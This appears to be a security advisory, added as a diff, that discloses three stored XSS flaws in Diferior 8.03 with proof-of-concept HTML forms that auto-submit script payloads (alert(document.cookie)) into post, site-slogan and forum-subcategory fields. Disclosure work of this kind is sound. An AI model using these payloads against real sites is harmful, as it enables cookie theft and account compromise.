@@ -1,0 +1,72 @@
+Vulnerability ID: HTB22721
+Reference: http://www.htbridge.ch/advisory/stored_xss_cross_site_scripting_vulnerability_in_diferior.html
+Product: Diferior
+Vendor: Povilas Musteikis ( http://www.diferior.com/ ) 
+Vulnerable Version: 8.03 and probably prior versions
+Vendor Notification: 
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "views/post.php" script to properly sanitize user-supplied input in "post_content" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/post/edit/2/p1.html" method="post" enctype="multipart/form-data" name="main">
+<input type="hidden" name="category" value="sample-category-1">
+<input type="hidden" name="header" value="Sample post">
+<input type="hidden" name="subheader" value="Sample subheader">
+<input type="hidden" name="post_content" value='html<script>alert(document.cookie)</script>'>
+<input type="hidden" name="schedule" value="now">
+<input type="hidden" name="scheduler" value="10/11/23">
+<input type="hidden" name="Date_Year" value="2010">
+<input type="hidden" name="Date_Month" value="11">
+<input type="hidden" name="Date_Day" value="22">
+<input type="hidden" name="Time_Hour" value="20">
+<input type="hidden" name="Time_Minute" value="47">
+<input type="hidden" name="Time_Second" value="23">
+<input type="hidden" name="usehtml" value="html">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "views/admin.php" script to properly sanitize user-supplied input in "slogan" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/site/2.html" method="post" name="main">
+<input type="hidden" name="title" value="Site Title">
+<input type="hidden" name="slogan" value='Powered by Diferior"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="timezone" value="GMT">
+<input type="hidden" name="cron" value="php">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "views/admin.php" script to properly sanitize user-supplied input in "subcatname" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/forum/create_sub.html" method="post" name="main">
+<input type="hidden" name="cat" value="1">
+<input type="hidden" name="subcatname" value='subname"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="description" value='description"><script>alert(document.cookie)</script>'>
+</form>
+<script>
+document.main.submit();
+</script>
+
